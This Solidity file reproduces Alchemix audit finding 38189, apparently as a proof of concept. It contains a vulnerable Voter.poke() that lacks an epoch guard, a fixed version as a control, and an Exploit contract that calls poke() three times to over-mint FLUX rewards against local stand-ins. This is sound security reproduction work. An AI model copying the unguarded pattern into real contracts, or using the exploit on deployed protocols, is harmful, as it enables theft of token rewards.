// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Alchemix finding 38189:
// "Lack of Access control in poke() function allows unlimited minting of flux".
//
// In Alchemix's Voter.sol, vote() and reset() carry the `onlyNewEpoch` guard,
// which reverts a second flux-accruing action within the same 2-week epoch.
// poke() ALSO routes into _vote() -> FluxToken.accrueFlux(), but it is MISSING
// the onlyNewEpoch modifier. A veALCX holder can therefore call poke() any
// number of times inside a single epoch, and each call re-runs
// `unclaimedFlux[tokenId] += claimableFlux`, over-minting FLUX far beyond the
// one-epoch entitlement. This breaks the invariant "a user should never be able
// to claim more rewards than they have earned".
//
// Verbatim vulnerable source (Voter.poke / Voter._vote accrual / the
// onlyNewEpoch modifier / FluxToken.accrueFlux) is taken from
// github.com/alchemix-finance/alchemix-v2-dao @ f1007439ad3a32e412468c4c42f62f676822dc1f
// (the finding's pinned commit). The FluxToken/VotingEscrow reward-math is
// reduced to a minimal faithful double: any positive per-call accrual proves
// the over-mint, so the exact fluxPerVeALCX formula is not load-bearing.
// ─────────────────────────────────────────────────────────────────────────────

interface IVotingEscrow {
    function isApprovedOrOwner(address _spender, uint256 _tokenId) external view returns (bool);
    function balanceOfToken(uint256 _tokenId) external view returns (uint256);
    function claimableFlux(uint256 _tokenId) external view returns (uint256);
}

interface IFluxToken {
    function accrueFlux(uint256 _tokenId) external;
    function getUnclaimedFlux(uint256 _tokenId) external view returns (uint256);
}

/// @dev Minimal ERC20 double used only to record the over-minted (illegitimate)
///      FLUX magnitude as a measurable balance at the attacker.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Minimal faithful double for the opaque VotingEscrow boundary. Only the
///      three functions the exploit path touches are represented. claimableFlux
///      returns a fixed positive per-epoch entitlement (balance * bps / 10000).
contract VotingEscrow {
    uint256 public constant BPS = 10_000;
    uint256 public fluxPerVeALCX = 5_000; // 50% of the veALCX balance per epoch

    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public bal;

    function setToken(uint256 _tokenId, address _owner, uint256 _balance) external {
        ownerOf[_tokenId] = _owner;
        bal[_tokenId] = _balance;
    }

    function isApprovedOrOwner(address _spender, uint256 _tokenId) external view returns (bool) {
        return ownerOf[_tokenId] == _spender;
    }

    function balanceOfToken(uint256 _tokenId) external view returns (uint256) {
        return bal[_tokenId];
    }

    function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (bal[_tokenId] * fluxPerVeALCX) / BPS;
    }
}

/// @dev FluxToken.accrueFlux is inlined VERBATIM from the audited source. The
///      per-call `unclaimedFlux[_tokenId] += amount` is exactly what poke()
///      re-triggers without an epoch guard.
contract FluxToken {
    address public voter;
    address public veALCX;
    mapping(uint256 => uint256) public unclaimedFlux; // tokenId => amount of unclaimed flux

    constructor(address _veALCX) {
        veALCX = _veALCX;
    }

    function setVoter(address _voter) external {
        voter = _voter;
    }

    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }

    function getUnclaimedFlux(uint256 _tokenId) external view returns (uint256) {
        return unclaimedFlux[_tokenId];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE Voter. poke()/_vote()/onlyNewEpoch are verbatim from Voter.sol;
// the gauge/bribe/pool accounting inside _vote() is elided (not load-bearing for
// the over-mint) exactly as the finding's own excerpt elides it.
// ─────────────────────────────────────────────────────────────────────────────
contract Voter {
    uint256 internal constant DURATION = 2 weeks;

    address public admin;
    address public immutable veALCX;
    address public immutable FLUX;

    mapping(uint256 => uint256) public lastVoted;
    mapping(uint256 => address[]) public poolVote;
    mapping(uint256 => mapping(address => uint256)) public votes;

    uint256 public lastTotalPower; // exposed: totalPower computed inside _vote

    constructor(address _veALCX, address _flux) {
        admin = msg.sender;
        veALCX = _veALCX;
        FLUX = _flux;
    }

    modifier onlyNewEpoch(uint256 _tokenId) {
        // Ensure new epoch since last vote
        require((block.timestamp / DURATION) * DURATION > lastVoted[_tokenId], "TOKEN_ALREADY_VOTED_THIS_EPOCH");
        _;
    }

    // vote() DOES carry the onlyNewEpoch guard, so it can accrue at most once per epoch.
    function vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost)
        external
        onlyNewEpoch(_tokenId)
    {
        require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        _vote(_tokenId, _poolVote, _weights, _boost);
    }

    function poke(uint256 _tokenId) public { // @> BUG: missing onlyNewEpoch guard (vote()/reset() have it) -> re-accrues FLUX on every call within one epoch
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }

    function _vote(uint256 _tokenId, address[] memory /*_poolVote*/, uint256[] memory /*_weights*/, uint256 _boost)
        internal
    {
        IFluxToken(FLUX).accrueFlux(_tokenId); // flux is accrued here
        uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);
        lastTotalPower = totalPower;
        lastVoted[_tokenId] = block.timestamp;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED Voter (negative control): poke() carries the same onlyNewEpoch guard as
// vote(), so a second poke inside one epoch reverts, capping accrual at 1x.
// ─────────────────────────────────────────────────────────────────────────────
contract VoterFixed {
    uint256 internal constant DURATION = 2 weeks;

    address public admin;
    address public immutable veALCX;
    address public immutable FLUX;

    mapping(uint256 => uint256) public lastVoted;
    mapping(uint256 => address[]) public poolVote;
    mapping(uint256 => mapping(address => uint256)) public votes;

    uint256 public lastTotalPower;

    constructor(address _veALCX, address _flux) {
        admin = msg.sender;
        veALCX = _veALCX;
        FLUX = _flux;
    }

    modifier onlyNewEpoch(uint256 _tokenId) {
        require((block.timestamp / DURATION) * DURATION > lastVoted[_tokenId], "TOKEN_ALREADY_VOTED_THIS_EPOCH");
        _;
    }

    function poke(uint256 _tokenId) public onlyNewEpoch(_tokenId) { // FIX: onlyNewEpoch added
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }

    function _vote(uint256 _tokenId, address[] memory /*_poolVote*/, uint256[] memory /*_weights*/, uint256 _boost)
        internal
    {
        IFluxToken(FLUX).accrueFlux(_tokenId);
        uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);
        lastTotalPower = totalPower;
        lastVoted[_tokenId] = block.timestamp;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a veALCX holder calls poke() 3x inside ONE epoch. Each call
// re-accrues a full epoch of FLUX, so the attacker's unclaimedFlux ends at 3x
// the legitimate per-epoch entitlement. The excess (2x) is over-minted from
// nothing and recorded on a marker token at the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant TOKEN_ID = 1;
    uint256 internal constant VE_BALANCE = 2 ether; // -> claimableFlux = 1 ether / epoch

    // Exposed results.
    uint256 public claimablePerCall; // 1x per-epoch entitlement
    uint256 public buggyUnclaimed;   // unclaimedFlux after 3 pokes (== 3x)
    uint256 public excessOverMint;   // illegitimate over-mint above 1 epoch (== 2x)
    uint256 public pokeCount;
    uint256 public attackerMarkerBalance;

    address public voterAddr;
    address public fluxAddr;
    address public escrowAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy the real vulnerable stack + minimal doubles (marker LAST) ---
        VotingEscrow escrow = new VotingEscrow();                          // nonce 1
        FluxToken flux = new FluxToken(address(escrow));                   // nonce 2
        Voter voter = new Voter(address(escrow), address(flux));           // nonce 3
        MiniToken marker = new MiniToken("Overminted FLUX", "OVERMINT-FLUX"); // nonce 4 (LAST)

        escrowAddr = address(escrow);
        fluxAddr = address(flux);
        voterAddr = address(voter);
        markerAddr = address(marker);

        // FluxToken.accrueFlux only accepts the voter; wire it up.
        flux.setVoter(address(voter));

        // The attacker holds veALCX token #1 with a positive balance.
        escrow.setToken(TOKEN_ID, ATTACKER, VE_BALANCE);

        // The legitimate entitlement is ONE epoch's claimableFlux.
        claimablePerCall = escrow.claimableFlux(TOKEN_ID); // 1 ether

        // --- EXPLOIT: poke() lacks onlyNewEpoch, so call it repeatedly in one epoch ---
        voter.poke(TOKEN_ID); // poke #1  -> +1x accrual
        voter.poke(TOKEN_ID); // poke #2  -> +1x accrual (would revert under the guard)
        voter.poke(TOKEN_ID); // poke #3  -> +1x accrual
        pokeCount = 3;

        // After 3 pokes the attacker is credited 3x their one-epoch entitlement.
        buggyUnclaimed = flux.getUnclaimedFlux(TOKEN_ID);

        // Harm: everything above a single epoch's accrual is over-minted from nothing.
        excessOverMint = buggyUnclaimed - claimablePerCall;

        // Record the over-minted magnitude as a measurable balance at the attacker.
        marker.mint(ATTACKER, excessOverMint);
        attackerMarkerBalance = marker.balanceOf(ATTACKER);
    }
}
